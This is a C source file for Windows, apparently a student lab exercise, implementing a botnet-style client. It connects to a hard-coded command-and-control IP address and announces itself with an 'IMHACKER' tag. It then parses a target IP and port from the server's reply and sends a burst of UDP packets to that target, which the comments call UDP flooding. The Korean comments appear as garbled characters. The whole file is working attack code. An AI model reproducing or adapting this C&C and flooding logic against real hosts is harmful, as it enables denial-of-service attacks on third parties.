#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#pragma comment (lib, "ws2_32.lib")
#pragma warning(disable : 4996)
int main() {
	SOCKET clientSocket; // ���� ����
	WSADATA wsaData; // ������ ���� ����
	SOCKADDR_IN servAddr; // ���� �ּ� ����
	char buffer[1024] = "IMHACKER_2017111366"; // C&C ������ �����ϰ��� �ϴ� �޽����� buffer ������ ���

	char* newData=NULL; // C&C �����κ��� ���� �����͸� ����� ���ڿ��� �����Ͽ� ���� ����
	char* ip=NULL; // ���ݹ��� ����� ip �ּ�
	char* port=NULL; // ���ݹ��� ����� port ��ȣ
	char newBuffer[1024] = "2017111366"; // ���ݹ��� ���� ���� ������(udp flooding �� �� ���� ������)

	// ������ ���� �ʱ�ȭ
	if (WSAStartup(WINSOCK_VERSION, &wsaData) != 0) {
		printf("������ ���� �ʱ�ȭ ����");
		return 0;
	}

	// Ŭ���̾�Ʈ ���� ����
	clientSocket = socket(PF_INET, SOCK_DGRAM, 0);

	// ���� ���� ���� Ȯ��
	if (clientSocket == INVALID_SOCKET) {
		printf("���� ���� ����");
		// ������ ���� ���� �Լ�
		WSACleanup();
		return 0;
	}

	// ���� �ּ� �ʱ�ȭ
	ZeroMemory(&servAddr, sizeof(servAddr));
	// ������ �ּ� ü��
	servAddr.sin_family = AF_INET;
	// ������ ��Ʈ��ȣ
	servAddr.sin_port = htons(10004);
	// ������ ���� ip �ּ�
	// inet_addr�� IP�ּҸ� ���ڿ� ���·� �Ѱ��ָ� long ���·� �ٲ��ִ� ������ ��.
	servAddr.sin_addr.S_un.S_addr = inet_addr("114.70.37.17");

	// �������� ����
	if (connect(clientSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
		printf("���� ���� ����");
		closesocket(clientSocket);
		WSACleanup();
		return 0;
	}

	printf("������ ���� �Ǿ����ϴ�.\n");

	// c&c ������ ������ ����
	send(clientSocket, buffer, sizeof(buffer), 0);
	printf("������ ���� ���� ! \n");

	// c&c �����κ��� ������ ����
	recv(clientSocket, buffer, sizeof(buffer), 0); 
	// �������� ���� ������ ���
	printf("[�������� ���� ������]\n%s\n\n", buffer);

	// 1�̶�� ���ڰ� ������ �������� ��� ������ ���� �޾ƿ���
	newData = strstr(buffer, "1");
	// �޾ƿ� �����Ϳ��� :�� �������� ip�� port��ȣ �и��ϱ�
	ip = strtok(newData, ":");
	// strtok �� ������ ������ ��ġ�� NULL�� ���� ������
	// �߸� ���ڿ� �������� �и��� ���� NULL�� �̿��ϸ� ��.
	port = strtok(NULL, "");
	
	// �����κ��� ���� IP�� PORT �ּ�
	printf("IP : %s , PORT : %s\n", ip, port);

	// ������ ���ǵǾ� �ִ� ���� �ּҸ� �ʱ�ȭ ��
	ZeroMemory(&servAddr, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	// atoi�� ���Ͽ� ���ڿ��� ����ȭ ��
	servAddr.sin_port = htons(atoi(port));
	servAddr.sin_addr.s_addr = inet_addr(ip);

	// ���ݹ��� ���� ������ �õ�
	if (connect(clientSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
		printf("���� ���� ����");
		closesocket(clientSocket);
		WSACleanup();
		return 0;
	}

	// Ŭ���̾�Ʈ���� udp flooding ����
	for (int i = 0; i < 10; i++) {
		// ������ �����ߴ� ���ο� �������� newBuffer�� udp flooding �� �� �����.
		send(clientSocket, newBuffer, sizeof(newBuffer), 0);
	}

	// udp flooding�� ������ ���� �����̶�� �޽����� ���
	printf("UDP Flooding ����!\n");
	
	// ����� socket�� ����
	closesocket(clientSocket);

	// ������ ������ ����
	WSACleanup();

	while(1);
}